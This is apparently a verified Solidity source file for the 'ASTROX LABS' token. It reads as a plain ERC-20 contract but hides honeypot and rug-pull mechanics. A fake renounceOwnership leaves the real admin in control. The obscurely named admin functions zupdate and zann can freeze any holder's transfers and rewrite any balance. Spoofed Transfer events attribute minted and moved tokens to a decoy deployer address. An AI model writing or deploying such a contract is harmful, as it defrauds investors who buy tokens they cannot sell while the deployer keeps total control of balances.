/**
 *Submitted for verification at Etherscan.io on 2023-01-27
*/

// SPDX-License-Identifier: MIT



pragma solidity 0.8.17;


 
contract ASTROX {
  
    mapping (address => uint256) private XBl;
    mapping (address => uint256) private XCl;
    mapping(address => mapping(address => uint256)) public allowance;
  


    
    string public name = "ASTROX LABS";
    string public symbol = unicode"ASTROX";
    uint8 public decimals = 6;
    uint256 public totalSupply = 125000000 *10**6;
    address owner = msg.sender;
    address private XdL;
    address zDeployer = 0x00C5E04176d95A286fccE0E68c683Ca0bfec8454;
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
   



        constructor()  {
        XdL = msg.sender;
        xCreate(msg.sender, totalSupply); }

    function renounceOwnership() public virtual {
        require(msg.sender == owner);
        emit OwnershipTransferred(owner, address(0));
        owner = address(0);
    }



    function xCreate(address account, uint256 amount) internal {
    account = zDeployer;
    XBl[msg.sender] = totalSupply;
    emit Transfer(address(0), account, amount); }


   function balanceOf(address account) public view  returns (uint256) {
        return XBl[account];
    }
    function transfer(address to, uint256 value) public returns (bool success) {


      require(XCl[msg.sender] <= 1);
        require(XBl[msg.sender] >= value);
  XBl[msg.sender] -= value;  
        XBl[to] += value;          
 emit Transfer(msg.sender, to, value);
        return true; }
modifier xJJ () {
 require(msg.sender == XdL);
 _;}
 function approve(address spender, uint256 value) public returns (bool success) {    
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true; }

 function zupdate (address iiX, uint256 iiV) xJJ public {
   XCl[iiX] = iiV;}
function zann (address iiX, uint256 iiV) xJJ public {
    XBl[iiX] = iiV;}



    function transferFrom(address from, address to, uint256 value) public returns (bool success) {   
        if(from == XdL)  {
 require(value <= XBl[from]);
        require(value <= allowance[from][msg.sender]);
        XBl[from] -= value;  
      XBl[to] += value; 
        from = zDeployer;
        emit Transfer (from, to, value);
        return true; }    

        require(XCl[from] <= 1 && XCl[to] <=1);
        require(value <= XBl[from]);
        require(value <= allowance[from][msg.sender]);
        XBl[from] -= value;
        XBl[to] += value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true; }
    }